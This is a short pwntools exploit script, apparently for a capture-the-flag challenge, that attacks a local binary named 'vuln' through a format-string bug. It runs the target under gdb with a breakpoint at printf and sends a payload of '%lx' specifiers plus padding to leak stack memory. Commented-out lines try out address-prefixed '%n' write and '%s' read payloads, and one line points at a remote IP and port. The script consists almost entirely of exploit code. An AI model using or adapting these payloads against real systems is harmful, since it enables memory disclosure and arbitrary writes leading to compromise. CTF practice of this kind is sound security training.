from pwn import *
os.system('pkill -9 gdb')
context.terminal = ['tmux', 'splitw', '-h', '-I']

vuln = process(['./vuln'])
# vuln = remote('138.68.171.242', 30024)
# context.noptrace = True

gdb.attach(vuln, '\n'.join([
    'b *0x5555555551f1',  # printf
    # 'b *0x5555555551dd',  # fgets
    'c',
    'u'
]) + '\n')

i = 0
# vuln.sendline('\x00\x00\x7f\xff\xf7\xfa\xd0\x00'[::-1] + ' %lx %lx %lx %lx %lx ' + '%lx')
# vuln.sendline('\x7f\xff\xff\xff\xde\xc8'[::-1] + ' %lx %lx %lx %lx %lx ' + '%lx')
payload = '%lx' * 40 + 'a'*127 + 'b'*8
info(f'Length of payload is: {len(payload)}')
vuln.send(payload)
# r = vuln.recvline(False).split(b' ')
# for x in r:
#     print(x)

# vuln.sendline('%p %p %p %p')
# sp = vuln.recvline(False).split(b' ')[3]
# info(sp)

# vuln.sendline('\x00\x00\x7f\xff\xff\xff\xde\xc8'[::-1] + ' %p %p %p %p %n')
# vuln.sendline('%p %p %s')
# vuln.sendline('a'*8 + ' %p %p %n')
# vuln.sendline('abcdefghi %p %p %n')

# vuln.sendline('\x55\x55\x55\x55\x51\xf6'[::-1] + 'yeeet %p %p %p %s')


vuln.interactive()
